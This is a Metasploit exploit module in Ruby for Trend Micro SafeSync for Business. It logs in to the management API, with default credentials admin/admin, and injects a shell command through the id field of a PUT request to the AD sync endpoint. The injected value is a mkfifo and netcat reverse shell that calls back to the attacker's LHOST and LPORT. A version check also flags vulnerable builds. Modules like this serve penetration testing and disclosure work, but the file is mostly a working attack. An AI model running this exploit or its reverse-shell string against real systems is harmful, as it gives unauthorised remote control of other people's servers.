##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'openssl'
require 'base64'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Trend Micro SafeSync for Business Exec Remote Code Injection",
      'Description'    => %q{
        This module exploits a vulnerability found in Trend Micro Safe Sync where an untrusted input is fed to ad_changed_sync.py, leading to command injection.
        Please note: authentication is required to exploit this vulnerability.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Quentin Kaiser <kaiserquentin[at]gmail.com>'
        ],
      'References'     =>
        [
        ],
      'Platform'        => 'linux',
      'Targets'         => [ [ 'Linux', {} ] ],
      'Payload'         => { 'BadChars' => "\x00" },
      'CmdStagerFlavor' => [ 'bourne' ],
      'Privileged'     => false,
      'DefaultOptions' =>
      {
         'SSL' => true
      },
      'DisclosureDate' => "Sep 6 2016",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to some web application', '/']),
        OptBool.new('SSL', [ true, 'Use SSL', true ]),
        OptAddress.new("LHOST", [true, "The local host for the exploits and handlers", Rex::Socket.source_address]),
        OptPort.new('LPORT', [true, "The port SPS will connect back to ", 4444 ]),
        OptString.new('ADMINACCOUNT', [true, 'Name of the SPS admin account', 'admin']),
        OptString.new('ADMINPASS', [true, 'Password of the SPS admin account', 'admin']),
      ], self.class)
  end

  def check
    opts = login
    if opts
      uri = target_uri.path
      res = send_request_cgi({
        'method'   => 'GET',
        'uri'      => normalize_uri(uri, "api", "system", "version"),
        'headers'=>
        {
          'Cookie' => "mgmtui_session=#{opts['mgmtui_session']}",
          'Referer' => "https://#{datastore['RHOST']}:#{datastore['RPORT']}/login.php",
          'Origin' =>  "https://#{datastore['RHOST']}:#{datastore['RPORT']}",
        }
      })
      if res and res.code == 200
        j = res.get_json_document
        version = j['version'].to_f
        build = j['build'].to_s.split('.')
        build_major = build[0].to_i(10)
        build_minor = build[1].to_i(10)
        build_version = build[2].to_i(10)
        build_tag = build[3].to_i(10)
        print_status("TrendMicro Safe Sync Server detected.")
        print_status("Version: #{version}")
        print_status("Build: #{j['build']}")

        if (version <= 2.1 and build_major == 3 and build_minor == 2 and build_version == 0 and build_tag < 1426)
            return Exploit::CheckCode::Vulnerable
        else
          return Exploit::CheckCode::Safe
        end
      end
    end
    Exploit::CheckCode::Safe
  end

  def execute_command(cmd, opts = {})
    uri = target_uri.path
    res = send_request_cgi({
      'method' => 'PUT',
      'uri' => normalize_uri(uri, "api", "admin", "ad", "ad_sync_now"),
      'ctype' => 'application/json',
      'headers' =>
      {
        'Referer' => "https://#{datastore['RHOST']}:#{datastore['RPORT']}/admin_ldap_integration.html",
        'Origin' =>  "https://#{datastore['RHOST']}:#{datastore['RPORT']}",
        'Cookie' => "mgmtui_session=#{opts['mgmtui_session']}",
      },
      'data' => "{\"id\": \"1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc #{datastore['LHOST']} #{datastore['LPORT']} >/tmp/f; ls\"}"
      }, 60)
  end

  def login
    uri = target_uri.path
    res = send_request_cgi({
      'method' => 'PUT',
      'uri' => normalize_uri(uri, "api", "auth", "login"),
      'ctype' => 'application/json',
      'headers'=>
      {
        'Referer' => "https://#{datastore['RHOST']}:#{datastore['RPORT']}/login.html",
        'Origin' =>  "https://#{datastore['RHOST']}:#{datastore['RPORT']}",
      },
      'data' => "{\"username\":\"#{datastore['ADMINACCOUNT']}\", \"password\":\"#{datastore['ADMINPASS']}\"}"
    })
    if res and res.code == 200 and !res.get_cookies.empty?
        mgmtui_session = res.get_cookies.scan(/mgmtui_session=([^;]*);/).last.first
        return {"mgmtui_session" => mgmtui_session}
    end
    nil
  end


  def exploit
    opts = login
    if opts
      print_status("Successfully logged in.")
      print_status("Exploiting...")
      execute_cmdstager(opts=opts)
    else
      print_error("An error occured while loggin in.")
    end
  end
end
